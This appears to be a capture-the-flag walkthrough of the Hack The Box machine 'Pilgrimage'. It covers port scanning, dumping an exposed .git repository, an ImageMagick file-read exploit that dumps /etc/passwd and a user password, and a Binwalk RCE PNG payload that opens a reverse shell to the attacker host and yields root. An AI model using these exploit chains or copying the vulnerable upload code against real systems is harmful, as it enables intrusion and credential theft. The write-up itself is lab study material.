Box Info:

![[box-info.png]]

i start with `rustscan`
```bash
rustscan -a $IP --ulimit 5000 --range 1-65000 -- -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.219:22
Open 10.10.11.219:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV" on ip 10.10.11.219
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 12:43 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Initiating Ping Scan at 12:43
Scanning 10.10.11.219 [2 ports]
Completed Ping Scan at 12:43, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:43
Completed Parallel DNS resolution of 1 host. at 12:43, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:43
Scanning 10.10.11.219 [2 ports]
Discovered open port 80/tcp on 10.10.11.219
Discovered open port 22/tcp on 10.10.11.219
Completed Connect Scan at 12:43, 0.17s elapsed (2 total ports)
Initiating Service scan at 12:43
Scanning 2 services on 10.10.11.219
Completed Service scan at 12:44, 6.43s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.219.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:44
Completed NSE at 12:44, 4.92s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:44
Completed NSE at 12:44, 0.67s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:44
Completed NSE at 12:44, 0.00s elapsed
Nmap scan report for 10.10.11.219
Host is up, received syn-ack (0.17s latency).
Scanned at 2023-06-30 12:43:56 EDT for 12s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnPDlM1cNfnBOJE71gEOCGeNORg5gzOK/TpVSXgMLa6Ub/7KPb1hVggIf4My+cbJVk74fKabFVscFgDHtwPkohPaDU8XHdoO03vU8H04T7eqUGj/I2iqyIHXQoSC4o8Jf5ljiQi7CxWWG2t0n09CPMkwdqfEJma7BGmDtCQcmbm36QKmUv6Kho7/LgsPJGBP1kAOgUHFfYN1TEAV6TJ09OaCanDlV/fYiG+JT1BJwX5kqpnEAK012876UFfvkJeqPYXvM0+M9mB7XGzspcXX0HMbvHKXz2HXdCdGSH59Uzvjl0dM+itIDReptkGUn43QTCpf2xJlL4EeZKZCcs/gu8jkuxXpo9lFVkqgswF/zAcxfksjytMiJcILg4Ca1VVMBs66ZHi5KOz8QedYM2lcLXJGKi+7zl3i8+adGTUzYYEvMQVwjXG0mPkHHSldstWMGwjXqQsPoQTclEI7XpdlRdjS6S/WXHixTmvXGTBhNXtrETn/fBw4uhJx4dLxNSJeM=
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOaVAN4bg6zLU3rUMXOwsuYZ8yxLlkVTviJbdFijyp9fSTE6Dwm4e9pNI8MAWfPq0T0Za0pK0vX02ZjRcTgv3yg=
|   256 d14e293c708669b4d72cc80b486e9804 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGkCiJaVyn29/d2LSyMWelMlcrxKVZsCCgzm6JjcH1W
80/tcp open  http    syn-ack nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:44
Completed NSE at 12:44, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:44
Completed NSE at 12:44, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:44
Completed NSE at 12:44, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds

                                                                                      
┌──(kali㉿kali)-[~]
└─$ 

```

Run nmap again with hostname

```bash
┌──(kali㉿pilgrimage)-[~/Workspace/Pilgrimage]
└─$ nmap -sC -sV -p22,80 $HOST -o nmap.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 12:54 EDT
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.47% done; ETC: 12:54 (0:00:00 remaining)
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds
```

Using `git-dumper` to download all the `.git` folder.
```bash
python git_dumper.py http://pilgrimage.htb/.git/ ../loot

```

```bash
┌──(kali㉿pilgrimage)-[~/Workspace/Pilgrimage/loot]
└─$ ls -lah
total 27M
drwxr-xr-x 5 kali kali 4.0K Jun 30 12:59 .
drwxr-xr-x 4 kali kali 4.0K Jun 30 12:58 ..
drwxr-xr-x 6 kali kali 4.0K Jun 30 12:59 assets
-rwxr-xr-x 1 kali kali 5.5K Jun 30 12:59 dashboard.php
drwxr-xr-x 7 kali kali 4.0K Jun 30 12:59 .git
-rwxr-xr-x 1 kali kali 9.1K Jun 30 12:59 index.php
-rwxr-xr-x 1 kali kali 6.7K Jun 30 12:59 login.php
-rwxr-xr-x 1 kali kali   98 Jun 30 12:59 logout.php
-rwxr-xr-x 1 kali kali  27M Jun 30 12:59 magick
-rwxr-xr-x 1 kali kali 6.7K Jun 30 12:59 register.php
drwxr-xr-x 4 kali kali 4.0K Jun 30 12:59 vendor
```

There are some configure may look specious:
`dashboard.php`
```php
function fetchImages() {

$username = $_SESSION['user'];

$db = new PDO('sqlite:/var/db/pilgrimage');

$stmt = $db->prepare("SELECT * FROM images WHERE username = ?");

$stmt->execute(array($username));

$allImages = $stmt->fetchAll(\PDO::FETCH_ASSOC);

return json_encode($allImages);

}
```
`Login.php`
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?
,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user
']));
      }
      header("Location: /?message=" . $upload_path . "&status=success");
    }
    else {
      header("Location: /?message=Image shrink failed&status=fail");
    }
  }
  else {
    header("Location: /?message=Image shrink failed&status=fail");
  }
}
```

- Upload accept `png` and `jpeg`. Default is `png`
- Call `magisk` to resize image. There are binary file in `git` directory.
- DB: /var/db/pilgrimage

Check the version of `magisk`:
```bash
┌──(kali㉿pilgrimage)-[~/Workspace/Pilgrimage/loot]
└─$ ./magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

Found this CVE and PoC: https://github.com/Sybil-Scan/imagemagick-lfi-poc

```
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
```
Go to `CyberChef` and convert from hex:
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

```

There are user `emily`
Tried to read db file, first i tried with `CyberChef` but it seem a bit slow. So i think i will write a short python script to run it on our machine.
```python

# Open the hex file in read mode
with open('db.hex', 'r') as hex_file:
# Read the contents of the file
	hex_data = hex_file.read()

# Convert the hex data to binary format
bytes_obj = bytes.fromhex(hex_data)

# Write the binary data to a new file
with open('db.bin', 'wb') as bin_file:
	bin_file.write(bytes_obj)

```

We have output in `db.bin`
Read `db.bin` there are password for `emily`
Password: `abigchonkyboi123`


SSH to server:
Check process running with `root`
```bash
emily@pilgrimage:/dev/shm$ ps -aux | grep root | grep -v "kworker\|card\|scsi\|irq"
root           1  0.0  0.2 163848  9964 ?        Ss   00:18   0:02 /sbin/init
root           2  0.0  0.0      0     0 ?        S    00:18   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   00:18   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   00:18   0:00 [rcu_par_gp]
root           8  0.0  0.0      0     0 ?        I<   00:18   0:00 [mm_percpu_wq]
root           9  0.0  0.0      0     0 ?        S    00:18   0:00 [rcu_tasks_rude_]
root          10  0.0  0.0      0     0 ?        S    00:18   0:00 [rcu_tasks_trace]
root          12  0.0  0.0      0     0 ?        I    00:18   0:01 [rcu_sched]
root          13  0.0  0.0      0     0 ?        S    00:18   0:00 [migration/0]
root          15  0.0  0.0      0     0 ?        S    00:18   0:00 [cpuhp/0]
root          16  0.0  0.0      0     0 ?        S    00:18   0:00 [cpuhp/1]
root          17  0.0  0.0      0     0 ?        S    00:18   0:00 [migration/1]
root          23  0.0  0.0      0     0 ?        S    00:18   0:00 [kdevtmpfs]
root          24  0.0  0.0      0     0 ?        I<   00:18   0:00 [netns]
root          25  0.0  0.0      0     0 ?        S    00:18   0:00 [kauditd]
root          27  0.0  0.0      0     0 ?        S    00:18   0:00 [khungtaskd]
root          28  0.0  0.0      0     0 ?        S    00:18   0:00 [oom_reaper]
root          29  0.0  0.0      0     0 ?        I<   00:18   0:00 [writeback]
root          30  0.0  0.0      0     0 ?        S    00:18   0:00 [kcompactd0]
root          31  0.0  0.0      0     0 ?        SN   00:18   0:00 [ksmd]
root          32  0.0  0.0      0     0 ?        SN   00:18   0:00 [khugepaged]
root          50  0.0  0.0      0     0 ?        I<   00:18   0:00 [kintegrityd]
root          51  0.0  0.0      0     0 ?        I<   00:18   0:00 [kblockd]
root          52  0.0  0.0      0     0 ?        I<   00:18   0:00 [blkcg_punt_bio]
root          53  0.0  0.0      0     0 ?        I<   00:18   0:00 [edac-poller]
root          54  0.0  0.0      0     0 ?        I<   00:18   0:00 [devfreq_wq]
root          57  0.0  0.0      0     0 ?        S    00:18   0:00 [kswapd0]
root          58  0.0  0.0      0     0 ?        I<   00:18   0:00 [kthrotld]
root          91  0.0  0.0      0     0 ?        I<   00:18   0:00 [acpi_thermal_pm]
root          93  0.0  0.0      0     0 ?        I<   00:18   0:00 [ipv6_addrconf]
root         102  0.0  0.0      0     0 ?        I<   00:18   0:00 [kstrp]
root         105  0.0  0.0      0     0 ?        I<   00:18   0:00 [zswap-shrink]
root         151  0.0  0.0      0     0 ?        I<   00:18   0:00 [ata_sff]
root         160  0.0  0.0      0     0 ?        I<   00:18   0:00 [mpt_poll_0]
root         163  0.0  0.0      0     0 ?        I<   00:18   0:00 [mpt/0]
root         468  0.0  0.0      0     0 ?        S    00:19   0:00 [jbd2/sda1-8]
root         469  0.0  0.0      0     0 ?        I<   00:19   0:00 [ext4-rsv-conver]
root         503  0.0  0.2  48416 11128 ?        Ss   00:19   0:00 /lib/systemd/systemd-journald
root         526  0.0  0.1  21720  5488 ?        Ss   00:19   0:00 /lib/systemd/systemd-udevd
root         573  0.0  0.2  47748 10392 ?        Ss   00:19   0:00 /usr/bin/VGAuthService
root         574  0.1  0.1 162996  7600 ?        Ssl  00:19   0:09 /usr/bin/vmtoolsd
root         584  0.0  0.0  87060  2080 ?        S<sl 00:19   0:00 /sbin/auditd
root         612  0.0  0.0      0     0 ?        I<   00:19   0:00 [ttm_swap]
root         643  0.0  0.1  99884  5640 ?        Ssl  00:19   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         654  0.0  0.0      0     0 ?        I<   00:19   0:00 [cryptd]
root         655  0.0  0.0   6744  2780 ?        Ss   00:19   0:00 /usr/sbin/cron -f
root         660  0.0  0.0   6816  2976 ?        Ss   00:19   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         667  0.0  0.6 209752 27304 ?        Ss   00:19   0:00 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
root         668  0.0  0.1 220796  4480 ?        Ssl  00:19   0:00 /usr/sbin/rsyslogd -n -iNONE
root         674  0.0  0.0   2516   708 ?        S    00:19   0:00 /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
root         675  0.0  0.0   6816  2432 ?        S    00:19   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         681  0.0  0.1  13856  7192 ?        Ss   00:19   0:00 /lib/systemd/systemd-logind
root         699  0.0  0.1  13352  7656 ?        Ss   00:19   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         703  0.0  0.0   5844  1648 tty1     Ss+  00:19   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         722  0.0  0.0  56376  1636 ?        Ss   00:19   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
root         789  0.0  0.0      0     0 ?        S    00:19   0:00 [hwmon1]
root        1325  0.0  0.0   6816  3044 ?        S    00:33   0:00 bash
root        1598  0.0  0.2  14508  8656 ?        Ss   01:10   0:00 sshd: emily [priv]
root        1672  0.0  0.0   6816  3168 ?        S    01:37   0:00 bash
root        1946  0.0  0.2  14508  8884 ?        Ss   02:02   0:00 sshd: emily [priv]
root       15586  0.0  0.2  14508  8780 ?        Ss   02:40   0:00 sshd: emily [priv]
root       15618  0.0  0.0   6816  3112 ?        S    02:41   0:00 bash
emily      15658  0.0  0.0   6212   644 pts/0    S+   02:47   0:00 grep root
```

There are process run  `/usr/sbin/malwarescan.sh`
Check the content of file - we can read it
```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"* ]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
```

This process call  `binwalk` . 
Check the `binwalk` version
```bash
emily@pilgrimage:/dev/shm$ binwalk

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...
```
- Binwalk v2.3.2
Search for exploit with this version, we found that on exploit-db:
https://www.exploit-db.com/exploits/51249

it embed a rce in `png` file. Lets try it
1. run code from exploit-db to generate `png` payload: 
```bash
┌──(kali㉿kali)-[~/Workspace/Pilgrimage]
└─$ python3 rev.py manc.png 10.10.14.53 9000
```
2. Upload code to victim machine and copy to the `/var/www/pilgrimage.htb/shrunk/` to tricker `binwalk`
- Start web service on kali:
 ```bash
- ┌──(kali㉿kali)-[~/Workspace/Pilgrimage]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.219 - - [01/Jul/2023 12:40:48] "GET /1.png HTTP/1.1" 200 -
```
 - Start a Listener: 
```bash
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nvlp 9000
rlwrap: warning: could not set locale
warnings can be silenced by the --no-warnings (-n) option
listening on [any] 9000 ...
```
 - Download file and copy to dest:
```bash
curl 10.10.14.53/1.png -o 1.png
cp 1.png /var/www/pilgrimage.htb/shrunk/
```

Boom!.
![[root.png]]